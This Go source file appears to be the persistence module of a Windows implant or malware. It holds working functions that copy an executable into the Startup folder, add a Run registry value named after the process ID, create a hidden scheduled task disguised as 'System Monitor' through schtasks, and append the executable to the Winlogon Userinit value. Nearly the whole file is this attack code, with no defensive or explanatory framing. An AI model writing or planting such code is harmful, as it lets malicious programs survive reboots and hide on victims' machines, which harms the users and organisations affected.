package run

import (
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "syscall"
    "golang.org/x/sys/windows/registry"
)

// Persistence types
const (
    StartupFolder   = "startup"
    RegistryRun     = "registry_run"
    ScheduledTask   = "scheduled_task"
    RegistryWinlogon = "registry_winlogon"
)
/*
func Persist(method string, execPath string, scope string) error {
    switch method {
    case StartupFolder:
        return addStartupFolder(execPath, scope)
    case RegistryRun:
        return addRegistryAutoRun(execPath, scope)
    case ScheduledTask:
        return addScheduledTask(execPath)
    case RegistryWinlogon:
        return addWinlogonPersist(execPath)
    default:
        return fmt.Errorf("unknown persistence method: %s", method)
    }
}
*/
func AddStartupFolder(execPath string, scope string) error {
    var startupPath string
    const startupDir = `Microsoft\Windows\Start Menu\Programs\Startup`

    switch scope {
    case "user":
        appData := os.Getenv("APPDATA")
        startupPath = filepath.Join(appData, startupDir)
    case "system":
        programData := os.Getenv("ProgramData")
        startupPath = filepath.Join(programData, startupDir)
    default:
        return fmt.Errorf("invalid scope: %s", scope)
    }

    // Creat directory if not exists
    if err := os.MkdirAll(startupPath, 0755); err != nil {
        return err
    }

    dest := filepath.Join(startupPath, filepath.Base(execPath))
    return copyFile(execPath, dest)
}

func AddRegistryAutoRun(execPath string, scope string) error {
    var (
        key registry.Key
        err error
        path string
    )

    switch scope {
    case "user":
        path = `Software\Microsoft\Windows\CurrentVersion\Run`
        key, err = registry.OpenKey(
            registry.CURRENT_USER,
            path,
            registry.ALL_ACCESS,
        )
    case "system":
        path = `Software\Microsoft\Windows\CurrentVersion\Run`
        key, err = registry.OpenKey(
            registry.LOCAL_MACHINE,
            path,
            registry.ALL_ACCESS,
        )
    default:
        return fmt.Errorf("invalid scope: %s", scope)
    }

    if err != nil {
        return fmt.Errorf("failed to open registry key: %w", err)
    }
    defer key.Close()

    valueName := fmt.Sprintf("%x", syscall.Getpid())
    return key.SetStringValue(valueName, execPath)
}


func AddScheduledTask(execPath string) error {
    // xml task file (simplified example)
    xml := fmt.Sprintf(`
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <RegistrationInfo>
        <Description>System Monitor</Description>
      </RegistrationInfo>
      <Triggers>
        <LogonTrigger>
          <Enabled>true</Enabled>
        </LogonTrigger>
      </Triggers>
      <Actions Context="Author">
        <Exec>
          <Command>%s</Command>
        </Exec>
      </Actions>
    </Task>`, execPath)

    // Write temporary XML file
    tmpFile := filepath.Join(os.TempDir(), "task.xml")
    if err := os.WriteFile(tmpFile, []byte(xml), 0644); err != nil {
        return err
    }
    defer os.Remove(tmpFile)

    // Create task using schtasks
    cmd := exec.Command("schtasks", "/Create", "/TN", "SystemMonitor", 
        "/XML", tmpFile, "/F")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    return cmd.Run()
}


func AddWinlogonPersist(execPath string) error {
    key, err := registry.OpenKey(
        registry.LOCAL_MACHINE,
        `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
        registry.ALL_ACCESS,
    )
    if err != nil {
        return err
    }
    defer key.Close()

    current, _, err := key.GetStringValue("Userinit")
    if err != nil && err != registry.ErrNotExist {
        return err
    }

    newValue := fmt.Sprintf(`%s,"%s"`, current, execPath)
    return key.SetStringValue("Userinit", newValue)
}

// Helper function to copy files
func copyFile(src, dst string) error {
    input, err := os.ReadFile(src)
    if err != nil {
        return err
    }
    return os.WriteFile(dst, input, 0755)
}
